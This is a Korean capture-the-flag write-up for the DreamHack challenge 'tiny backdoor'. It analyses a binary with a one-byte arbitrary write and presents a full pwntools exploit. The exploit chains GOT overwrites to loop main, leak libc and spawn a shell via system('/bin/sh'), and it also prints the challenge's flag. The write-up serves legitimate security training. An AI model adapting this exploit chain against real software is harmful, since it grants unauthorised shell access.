# [DreamHack] tiny backdoor

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> 드림이는 우연히 컴퓨터에 설치된 의문의 프로그램을 발견했습니다.
> 아주 작은 프로그램이지만 백도어로 이용할 수 있다고 합니다.
> 문제의 백도어를 해킹하여 쉘을 획득해보세요!
>
> Release: [tiny backdoor.zip](https://github.com/h0meb0dy/Dreamhack-Wargame/files/8559030/tiny.backdoor.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/102066383/162897050-b2c1fd03-a559-4535-bef7-05ef19859edf.png)

## Analysis

```c
unsigned __int64 __fastcall main(int argc, char **argv, char **envp)
{
  char value; // bl
  unsigned __int64 v5; // [rsp+8h] [rbp-10h]

  v5 = __readfsqword(0x28u);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  value = read_reversed_int();
  *(_BYTE *)read_reversed_int() = value;        // 1byte AAW
  return __readfsqword(0x28u) ^ v5;
}
```

`read_reversed_int()`는 정수를 입력받는 함수인데, 입력한 정수를 앞뒤로 뒤집어서 반환한다. 예를 들어 1234를 입력하면 4321을 반환한다.

값과 주소를 입력해서, 원하는 주소의 1바이트를 원하는 값으로 덮을 수 있다.

```c
int no_brute()
{
  sleep(1u);
  return puts("no brute");
}
```

```
[-------------------------------------code-------------------------------------]
   0x4005be:    call   0x400550 <__stack_chk_fail@plt>
   0x4005c3:    lea    rdi,[rip+0x24a]        # 0x400814
   0x4005ca:    add    rsp,0x18
=> 0x4005ce:    jmp    0x400540 <puts@plt>
 | 0x4005d3:    push   rbx
 | 0x4005d4:    xor    esi,esi
 | 0x4005d6:    sub    rsp,0x10
 | 0x4005da:    mov    rdi,QWORD PTR [rip+0x20062f]        # 0x600c10 <stdin>
 |->   0x400540 <puts@plt>:     jmp    QWORD PTR [rip+0x20067a]        # 0x600bc0
       0x400546 <puts@plt+6>:   push   0x0
       0x40054b <puts@plt+11>:  jmp    0x400530
       0x400550 <__stack_chk_fail@plt>: jmp    QWORD PTR [rip+0x200672]        # 0x600bc8
                                                                  JUMP is taken
...
gdb-peda$ bt
#0  0x00000000004005ce in ?? ()
#1  0x00007f074d6d8d13 in _dl_fini () at dl-fini.c:138
#2  0x00007f074d31a031 in __run_exit_handlers (status=0x0, listp=0x7f074d6c2718 <__exit_funcs>, run_list_atexit=run_list_atexit@entry=0x1, run_dtors=run_dtors@entry=0x1) at exit.c:108
#3  0x00007f074d31a12a in __GI_exit (status=<optimized out>) at exit.c:139
#4  0x00007f074d2f8c8e in __libc_start_main (main=0x4005d3, argc=0x1, argv=0x7ffe9eb3da38, init=<optimized out>, fini=<optimized out>, rtld_fini=<optimized out>, stack_end=0x7ffe9eb3da28)
    at ../csu/libc-start.c:344
#5  0x000000000040066a in ?? ()
```

`main()`이 리턴되고 나서는 `_dl_fini()` 내부에서 `no_brute()`를 호출한다. 이 함수는 1초동안 대기한 후 `"no brute"`를 출력하고 리턴된다.

## Exploit

```python
# ex) 1234 -> '4321'
def reverse(n):
    result = ''

    digits = 0
    while 1:
        if int(n / (10 ** digits)) == 0:
            break
        else:
            digits += 1
    
    for digit in range(digits):
        number = int(n / (10 ** (digits - digit - 1)))
        result = str(number) + result
        n %= (10 ** (digits - digit - 1))

    return result

# write 1byte value on addr
def aaw(addr, value):
    r.sendline(str(reverse(value)))
    r.sendline(str(reverse(addr)))
```

### Make loop

한 번의 AAW로는 익스플로잇을 할 수 없기 때문에 함수들의 GOT를 조작하여 `main()`이 여러 번 반복되도록 만든다. 뒤에서 `setbuf()`를 덮어서 써야 하는데 `main()`의 `setbuf()`를 호출하지 않으려면 `0x400600`보다 큰 주소로 점프해야 한다.

![image](https://user-images.githubusercontent.com/102066383/163415866-e8983625-dd7a-4cf2-95db-bdee1bfd1148.png)

따라서 먼저 `sleep()`의 GOT를 `0x4005f6`으로 덮어서 `main+0x23`으로 돌리고, 그 다음에 `puts()`의 GOT를 `0x400606`으로 덮어서 `setbuf()`를 호출하는 주소보다 뒤쪽으로 점프하도록 만든다.

```python
# make loop

# sleep() -> main+0x23
aaw(sleep_got, (main + 0x23) & 0xff)

# __stack_chk_fail() -> main+0x23
aaw(__stack_chk_fail_got, (main + 0x23) & 0xff)

# puts() -> main+0x33
aaw(puts_got, (main + 0x33) & 0xff)
aaw(puts_got + 1, ((main + 0x33) & 0xff00) >> 8)

# __stack_chk_fail() -> no_brute+0x3e (jmp puts@plt -> main+0x33)
aaw(__stack_chk_fail_got, (no_brute + 0x3e) & 0xff)
```

### Leak libc

`main()`에서는 전역 변수 `stdout`에 저장된 값을 `rdi`에 넣고 `setbuf()`를 호출한다. `setbuf()`의 GOT를 `puts()`의 PLT로 덮고, `stdout`에는 `__libc_start_main()`의 GOT 주소를 넣어서 `__libc_start_main()`의 주소를 leak할 수 있다.

```python
# leak libc

# setbuf() -> puts@plt+6 -> puts()
for offset in range(8):
    aaw(setbuf_got + offset, ((puts_plt + 6) & (0xff << (8 * offset))) >> (8 * offset))

# stdout ->  __libc_start_main@got
for offset in range(8):
    aaw(stdout + offset, (__libc_start_main_got & (0xff << (8 * offset))) >> (8 * offset))

# setbuf(stdout) -> puts(__libc_start_main@got)
aaw(__stack_chk_fail_got, main + 0x23)

__libc_start_main = u64(r.recvline()[:-1].ljust(8, b'\x00')) # __libc_start_main()
libc = __libc_start_main - __libc_start_main_offset # libc base
system = libc + system_offset # system()
binsh = libc + binsh_offset # "/bin/sh"
```

### Call system("/bin/sh")

`puts()`의 GOT를 `system()`의 주소로 덮고, `stdout`에 `"/bin/sh"`의 주소를 넣고, `setbuf()`의 GOT는 `no_brute()`에서 `puts()`를 호출하는 주소로 덮고 같은 방식으로 `setbuf(stdout)`을 호출하면 셸을 획득할 수 있다. 

![image](https://user-images.githubusercontent.com/102066383/163415683-cf90f172-afc8-4de2-a19b-259154b16555.png)

바로 `0x4005ce`로 점프하면 스택 정렬이 되지 않아서 에러가 발생하기 때문에 ,`0x4005ca`로 점프해서 스택이 정렬된 상태에서 `system()`이 호출되도록 한다.

```python
# call system("/bin/sh")

# sleep() -> main+0x33
aaw(sleep_got, (main + 0x33) & 0xff)
aaw(sleep_got + 1, ((main + 0x33) & 0xff00) >> 8)

# __stack_chk_fail() -> no_brute+0x19 (call sleep() -> main+0x33)
aaw(__stack_chk_fail_got, (no_brute + 0x19) & 0xff)

# puts() -> system()
for offset in range(8):
    aaw(puts_got + offset, (system & (0xff << (8 * offset))) >> (8 * offset))

# setbuf() -> no_brute+0x3a (add rsp,0x18; jmp puts@plt) (for stack alignment)
aaw(setbuf_got, (no_brute + 0x3a) & 0xff)

# stdout -> "/bin/sh"
for offset in range(8):
    aaw(stdout + offset, (binsh & (0xff << (8 * offset))) >> (8 * offset))

# __stack_chk_fail() -> main+0x23 -> setbuf(stdout) -> system("/bin/sh")
aaw(__stack_chk_fail_got, (main + 0x23) & 0xff)
```

### Full exploit

```python
from pwn import *
# context(log_level='debug')

REMOTE = True

if not REMOTE:
    r = process('./release/backdoor')
    __libc_start_main_offset = 0x21ba0
    system_offset = 0x4f420
    binsh_offset = 0x1b3d88
else:
    r = remote('host1.dreamhack.games', 19453)
    __libc_start_main_offset = 0x21b10
    system_offset = 0x4f550
    binsh_offset = 0x1b3e1a

# ex) 1234 -> '4321'
def reverse(n):
    result = ''

    digits = 0
    while 1:
        if int(n / (10 ** digits)) == 0:
            break
        else:
            digits += 1
    
    for digit in range(digits):
        number = int(n / (10 ** (digits - digit - 1)))
        result = str(number) + result
        n %= (10 ** (digits - digit - 1))

    return result

# write 1byte value on addr
def aaw(addr, value):
    r.sendline(str(reverse(value)))
    r.sendline(str(reverse(addr)))

main = 0x4005d3 # main()
no_brute = 0x400590 # no_brute()
puts_plt = 0x400540 # PLT of puts()
puts_got = 0x600bc0 # GOT of puts()
__libc_start_main_got = 0x600b98 # GOT of __libc_start_main()
__stack_chk_fail_got = 0x600bc8 # GOT of __stack_chk_fail()
setbuf_got = 0x600bd0 # GOT of setbuf()
sleep_got = 0x600be0 # GOT of sleep()
stdout = 0x600c00 # global var <stdout>


# make loop

# sleep() -> main+0x23
aaw(sleep_got, (main + 0x23) & 0xff)

# __stack_chk_fail() -> main+0x23
aaw(__stack_chk_fail_got, (main + 0x23) & 0xff)

# puts() -> main+0x33
aaw(puts_got, (main + 0x33) & 0xff)
aaw(puts_got + 1, ((main + 0x33) & 0xff00) >> 8)

# __stack_chk_fail() -> no_brute+0x3e (jmp puts@plt -> main+0x33)
aaw(__stack_chk_fail_got, (no_brute + 0x3e) & 0xff)


# leak libc

# setbuf() -> puts@plt+6 -> puts()
for offset in range(8):
    aaw(setbuf_got + offset, ((puts_plt + 6) & (0xff << (8 * offset))) >> (8 * offset))

# stdout ->  __libc_start_main@got
for offset in range(8):
    aaw(stdout + offset, (__libc_start_main_got & (0xff << (8 * offset))) >> (8 * offset))

# setbuf(stdout) -> puts(__libc_start_main@got)
aaw(__stack_chk_fail_got, main + 0x23)

__libc_start_main = u64(r.recvline()[:-1].ljust(8, b'\x00')) # __libc_start_main()
libc = __libc_start_main - __libc_start_main_offset # libc base
system = libc + system_offset # system()
binsh = libc + binsh_offset # "/bin/sh"


# call system("/bin/sh")

# sleep() -> main+0x33
aaw(sleep_got, (main + 0x33) & 0xff)
aaw(sleep_got + 1, ((main + 0x33) & 0xff00) >> 8)

# __stack_chk_fail() -> no_brute+0x19 (call sleep() -> main+0x33)
aaw(__stack_chk_fail_got, (no_brute + 0x19) & 0xff)

# puts() -> system()
for offset in range(8):
    aaw(puts_got + offset, (system & (0xff << (8 * offset))) >> (8 * offset))

# setbuf() -> no_brute+0x3a (add rsp,0x18; jmp puts@plt) (for stack alignment)
aaw(setbuf_got, (no_brute + 0x3a) & 0xff)

# stdout -> "/bin/sh"
for offset in range(8):
    aaw(stdout + offset, (binsh & (0xff << (8 * offset))) >> (8 * offset))

# __stack_chk_fail() -> main+0x23 -> setbuf(stdout) -> system("/bin/sh")
aaw(__stack_chk_fail_got, (main + 0x23) & 0xff)


r.interactive()
```

```
$ python3 solve.py
[+] Opening connection to host1.dreamhack.games on port 19453: Done
[*] Switching to interactive mode
\x10\x16\x98\x7f
\x10\x16\x98\x7f
$ cat flag.txt
DH{86bb4a1255f18b5942def47ce5171538}
```
